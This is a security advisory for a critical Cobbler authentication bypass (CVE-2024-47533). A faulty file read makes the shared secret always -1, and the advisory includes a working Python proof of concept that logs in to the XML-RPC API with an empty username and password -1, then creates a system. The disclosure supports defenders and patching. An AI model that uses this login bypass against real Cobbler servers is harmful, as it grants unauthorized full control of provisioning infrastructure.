# cobbler allows anyone to connect to cobbler XML-RPC server with known password and make changes

**GHSA**: GHSA-m26c-fcgh-cp6h | **CVE**: CVE-2024-47533 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-287

**Affected Packages**:
- **cobbler** (pip): >= 3.3.0, < 3.3.7
- **cobbler** (pip): >= 3.0.0, < 3.2.3

## Description

### Summary

utils.get_shared_secret() always returns -1 - allows anyone to connect to cobbler XML-RPC as user '' password -1 and make any changes.

### Details
utils.py get_shared_secret:
```
def get_shared_secret() -> Union[str, int]:
    """
    The 'web.ss' file is regenerated each time cobblerd restarts and is used to agree on shared secret interchange
    between the web server and cobblerd, and also the CLI and cobblerd, when username/password access is not required.
    For the CLI, this enables root users to avoid entering username/pass if on the Cobbler server.

    :return: The Cobbler secret which enables full access to Cobbler.
    """

    try:
        with open("/var/lib/cobbler/web.ss", 'rb', encoding='utf-8') as fd:
            data = fd.read()
    except:
        return -1
    return str(data).strip()
```
Always returns `-1` because of the following exception:
```
binary mode doesn't take an encoding argument
```

This appears to have been introduced by commit 32c5cada013dc8daa7320a8eda9932c2814742b0 and so affects versions 3.0.0+.

### PoC
```
#!/usr/bin/python3

import ssl
import xmlrpc.client

params = { 'proto': 'https', 'host': 'COBBLER_SERVER', 'port': '443', 'username': '', 'password': -1 }
ssl_context = ssl._create_unverified_context()

url = '{proto}://{host}:{port}/cobbler_api'.format(**params)
if ssl_context:
    conn = xmlrpc.client.ServerProxy(url, context=ssl_context)
else:
    conn = xmlrpc.client.Server(url)

try:
    token = conn.login(params['username'], params['password'])
except xmlrpc.client.Fault as e:
    print("Failed to log in to Cobbler '{url}' as '{username}'. {error}".format(url=url, error=e, **params))
except Exception as e:
    print("Connection to '{url}' failed. {error}".format(url=url, error=e, **params))

print("Login success!")

system_id = conn.new_system(token)
```


### Impact
This gives anyone with network access to a cobbler server full control of the server.

